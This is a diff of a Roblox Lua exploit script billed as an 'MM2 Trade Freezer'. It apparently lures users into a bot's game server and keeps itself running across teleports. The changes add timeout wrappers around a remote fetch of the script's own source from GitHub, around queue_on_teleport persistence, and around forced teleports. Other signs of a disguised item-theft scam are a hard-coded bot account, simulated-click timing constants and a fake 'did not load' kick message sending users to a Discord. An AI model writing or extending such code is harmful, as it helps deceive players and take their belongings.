@@ -1,8 +1,7 @@
 --============================================================
--- SIDE 2 — CLIENT (v47)
+-- SIDE 2 — CLIENT (v48)
 -- MM2 Trade Freezer — PC + Mobile
--- Non-blocking teleport (spawned thread + timeout)
--- Self-verifying join + name-scan fallbacks
+-- Every external call wrapped with timeout (Delta-safe)
 --============================================================
 local Players             = game:GetService("Players")
 local VirtualInputManager = game:GetService("VirtualInputManager")
@@ -65,7 +64,7 @@ local CONFIRM_WAIT        = 7
 local CLICK_GAP           = 0.4
 local POST_JOIN_WAIT      = 10
 local SNIPE_POLL_INTERVAL = 3
-local TELEPORT_METHOD_TIMEOUT = 3   -- seconds before giving up on a method
+local BLOCKED_CALL_TIMEOUT = 3   -- seconds before treating a hung call as blocked
 local KICK_MESSAGE        = "Error, script did not load in time, try another time or contact support in https://discord.gg/SfeBgTx5V8"
 
 local SELF_SOURCE_URL     = "https://raw.githubusercontent.com/tturnaa/mm2-trade-freezer/refs/heads/main/trade"
@@ -74,6 +73,35 @@ log("config loaded | Bot:", BOT_USERNAME, "| Discord:", DISCORD_USERNAME)
 --================================================
 
 local KILLED = false
+
+--==================== TIMEOUT HELPER ====================
+-- Runs a function inside a spawned thread. If it doesn't finish in
+-- BLOCKED_CALL_TIMEOUT seconds, we assume the executor blocked it.
+-- Returns (ok, result_or_error, timedout).
+local function runWithTimeout(fn, timeout)
+    timeout = timeout or BLOCKED_CALL_TIMEOUT
+    local done = false
+    local result_ok = nil
+    local result_val = nil
+
+    task.spawn(function()
+        local ok, val = pcall(fn)
+        result_ok = ok
+        result_val = val
+        done = true
+    end)
+
+    local endT = tick() + timeout
+    while tick() < endT and not done do
+        task.wait(0.1)
+    end
+
+    if not done then
+        return false, nil, true   -- timed out
+    end
+    return result_ok, result_val, false
+end
+--================================================
 
 --==================== AUTO-EXEC ====================
 local TeleportCheck = false
@@ -85,40 +113,46 @@ local function queueAutoExec()
     end
     TeleportCheck = true
 
-    local source = nil
-    if SELF_SOURCE_URL and SELF_SOURCE_URL ~= "" then
-        log("autoexec: fetching source...")
-        local ok, body = pcall(function()
-            if game.HttpGetAsync then
-                return game:HttpGetAsync(SELF_SOURCE_URL)
-            end
-            return game:HttpGet(SELF_SOURCE_URL, true)
-        end)
-        if ok and type(body) == "string" and #body > 100 then
-            source = body
-            log("autoexec: fetched", #source, "bytes")
-        else
-            log("autoexec: fetch FAILED")
-        end
-    end
+    log("autoexec: fetching source (with timeout)...")
 
-    if not source then
-        log("autoexec: no source")
+    local fetchOk, source, fetchTimedout = runWithTimeout(function()
+        return game:HttpGet(SELF_SOURCE_URL, true)
+    end)
+
+    if fetchTimedout then
+        log("autoexec: fetch HUNG (executor blocked HttpGet) — skipping")
         return false
     end
+
+    if not fetchOk or type(source) ~= "string" or #source < 100 then
+        log("autoexec: fetch failed")
+        return false
+    end
+
+    log("autoexec: fetched " .. #source .. " bytes")
 
     local queueteleport = queue_on_teleport
         or queueonteleport
         or (syn and syn.queue_on_teleport)
         or (fluxus and fluxus.queue_on_teleport)
 
-    if type(queueteleport) == "function" then
-        local ok = pcall(queueteleport, source)
-        log("autoexec: queued ok =", ok)
-        return ok
+    if type(queueteleport) ~= "function" then
+        log("autoexec: no queue function available")
+        return false
     end
-    log("autoexec: no queue function")
-    return false
+
+    log("autoexec: calling queue function (with timeout)...")
+    local qOk, qVal, qTimedout = runWithTimeout(function()
+        return queueteleport(source)
+    end)
+
+    if qTimedout then
+        log("autoexec: queue_on_teleport HUNG — skipping")
+        return false
+    end
+
+    log("autoexec: queued ok = " .. tostring(qOk and qVal ~= false))
+    return qOk and qVal ~= false
 end
 
 task.spawn(function()
@@ -312,35 +346,21 @@ local function findBot()
     end
 end
 
---==================== TELEPORT (non-blocking) ====================
+--==================== TELEPORT (all methods timeout-wrapped) ====================
 local function tryTeleportMethod(methodName, methodFn)
     log("attempting " .. methodName .. "...")
+    local ok, val, timedout = runWithTimeout(methodFn)
 
-    local done = false
-    local result = nil
-
-    task.spawn(function()
-        local ok, err = pcall(methodFn)
-        result = { ok = ok, err = err }
-        done = true
-    end)
-
-    local endT = tick() + TELEPORT_METHOD_TIMEOUT
-    while tick() < endT and not done do
-        task.wait(0.1)
-    end
-
-    if not done then
-        log("  " .. methodName .. " STILL HANGING after " ..
-            TELEPORT_METHOD_TIMEOUT .. "s — executor blocked it")
+    if timedout then
+        log("  " .. methodName .. " STILL HANGING — executor blocked it")
         return false
     end
 
-    if result.ok then
+    if ok then
         log("  " .. methodName .. " fired successfully")
         return true
     else
-        log("  " .. methodName .. " returned error: " .. tostring(result.err))
+        log("  " .. methodName .. " returned error: " .. tostring(val))
         return false
     end
 end
@@ -353,7 +373,7 @@ local function teleportToServer(placeId, jobId, userId)
     queueAutoExec()
     task.wait(0.5)
 
-    -- Method 1: TeleportToPlaceInstance (works on PC and some mobiles)
+    -- Method 1: TeleportToPlaceInstance
     if tryTeleportMethod("TeleportToPlaceInstance", function()
         TeleportService:TeleportToPlaceInstance(placeId, jobId, player)
     end) then
@@ -369,11 +389,11 @@ local function teleportToServer(placeId, jobId, userId)
         end
     end
 
-    log("=== TELEPORT FAILED (all methods blocked or hung) ===")
+    log("=== TELEPORT FAILED (all methods blocked/hung) ===")
     return false
 end
 
---==================== JOIN (self-verifying) ====================
+--==================== JOIN ====================
 local function joinTargetServer()
     log("=== JOIN START ===")
     kvSet("client_ask", "ASK")
@@ -419,7 +439,6 @@ local function joinTargetServer()
                         return true
                     end
 
-                    -- Wait 1s and re-read beacon in case the bot hopped
                     task.wait(1)
                     local beacon2 = kvGet("roblox_beacon")
                     local info2 = parseServerBeacon(beacon2)
@@ -441,7 +460,7 @@ local function joinTargetServer()
                             local currentBeacon = kvGet("roblox_beacon")
                             local currentInfo = parseServerBeacon(currentBeacon)
                             if currentInfo and currentInfo.jobId == game.JobId then
-                                log("  confirmed: we are in bot's server now")
+                                log("  confirmed: we are in bot's server")
                                 joined = true
                                 break
                             end
@@ -452,11 +471,11 @@ local function joinTargetServer()
                             end
                         end
                         if not joined then
-                            log("  never landed in bot's server after teleport")
+                            log("  never landed in bot's server")
                             return false
                         end
                     else
-                        log("  ❌ teleport failed — user must join manually")
+                        log("  teleport failed — user must join manually")
                     end
 
                     return ok
